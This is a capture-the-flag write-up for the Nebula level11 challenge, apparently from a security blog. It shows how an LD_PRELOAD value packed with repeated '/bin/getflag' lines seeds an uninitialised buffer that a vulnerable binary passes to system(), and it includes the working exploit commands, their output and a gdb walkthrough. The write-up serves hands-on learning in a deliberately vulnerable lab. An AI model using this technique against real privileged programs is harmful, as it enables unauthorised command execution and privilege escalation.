+++
author = "pwntester"
categories = ["nebula11"]
date = 2013-11-27T17:30:00Z
description = ""
draft = false
slug = "nebula-level11-revisited"
tags = ["nebula11"]
title = "Nebula level11 revisited"

+++

After reading this great [post](http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/) by Dan Rosenberg, I learned about using **LD_PRELOAD** to pre-populate uninitializaed variables with arbitrary contents. The details are explained in the article, I just wanted to show how it can be used to solve challange 11.

Ok, so we are going to try to fill the uninitialized buffer used in the process function with a string containing the commands to be be run:

```lang-bash line-numbers 
level11@nebula:/home/flag11$ export LD_PRELOAD=`python -c 'print("\x0a/bin/getflag"*80)'`
```

Now we can go and execute our binary and see if it works:
```lang-bash line-numbers 
level11@nebula:/home/flag11$ python -c 'print "Content-Length: 1\n"' | ./flag11
ERROR: ld.so: object '
/bin/getflag
/bin/getflag
...
...
/bin/getflag
/bin/getflag
/bin/getflag' from LD_PRELOAD cannot be preloaded: ignored.
sh: $'\v': command not found
You have successfully executed getflag on a target account
You have successfully executed getflag on a target account
...
...
You have successfully executed getflag on a target account
You have successfully executed getflag on a target account
sh: line 75: /bin=q�: No such file or directory
```

The first error is when trying to link our fake library, then there is an error:

```lang-bash line-numbers 
sh: $'\v': command not found
```

Followed by a bunch of successful **getflag** executions and then another error:

```lang-bash line-numbers 
sh: line 75: /bin=q�: No such file or directory
```

Lets see what was the string passed to **system()**:

```lang-bash line-numbers 
(gdb) b main
Breakpoint 1 at 0x8048956
(gdb) b process
Breakpoint 2 at 0x80488fd
(gdb) run
Starting program: /home/flag11/flag11
.. rubish ..
Breakpoint 1, 0x08048956 in main ()
(gdb) c
Continuing.
Content-Length: 1


Breakpoint 2, 0x080488fd in process ()
(gdb) disas process
Dump of assembler code for function process:
   0x080488f7 <+0>:	push   %ebp
   0x080488f8 <+1>:	mov    %esp,%ebp
   0x080488fa <+3>:	sub    $0x28,%esp
=> 0x080488fd <+6>:	mov    0xc(%ebp),%eax
   0x08048900 <+9>:	and    $0xff,%eax
   0x08048905 <+14>:	mov    %eax,-0x10(%ebp)
   0x08048908 <+17>:	movl   $0x0,-0xc(%ebp)
   0x0804890f <+24>:	jmp    0x804893c <process+69>
   0x08048911 <+26>:	mov    -0xc(%ebp),%eax
   0x08048914 <+29>:	add    0x8(%ebp),%eax
   0x08048917 <+32>:	mov    -0xc(%ebp),%edx
   0x0804891a <+35>:	add    0x8(%ebp),%edx
   0x0804891d <+38>:	movzbl (%edx),%edx
   0x08048920 <+41>:	mov    %edx,%ecx
   0x08048922 <+43>:	mov    -0x10(%ebp),%edx
   0x08048925 <+46>:	xor    %ecx,%edx
   0x08048927 <+48>:	mov    %dl,(%eax)
   0x08048929 <+50>:	mov    -0xc(%ebp),%eax
   0x0804892c <+53>:	add    0x8(%ebp),%eax
   0x0804892f <+56>:	movzbl (%eax),%eax
   0x08048932 <+59>:	movsbl %al,%eax
   0x08048935 <+62>:	sub    %eax,-0x10(%ebp)
   0x08048938 <+65>:	addl   $0x1,-0xc(%ebp)
   0x0804893c <+69>:	mov    -0xc(%ebp),%eax
   0x0804893f <+72>:	cmp    0xc(%ebp),%eax
   0x08048942 <+75>:	jl     0x8048911 <process+26>
   0x08048944 <+77>:	mov    0x8(%ebp),%eax
   0x08048947 <+80>:	mov    %eax,(%esp)
   0x0804894a <+83>:	call   0x80485f0 <system@plt>
   0x0804894f <+88>:	leave
   0x08048950 <+89>:	ret
End of assembler dump.
(gdb) b *process + 83
Breakpoint 3 at 0x804894a
(gdb) c
Continuing.

Breakpoint 3, 0x0804894a in process ()
(gdb) x/s $eax
0xbf927dfc:	 "\vflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getflag\n\n/bin/getfla"...
```

Ok, so there we can see how buffer was initialized and why we got the first command error when running **\vflag** and why we got so many **getflag** executions thanks to using the new line character **%x0a**
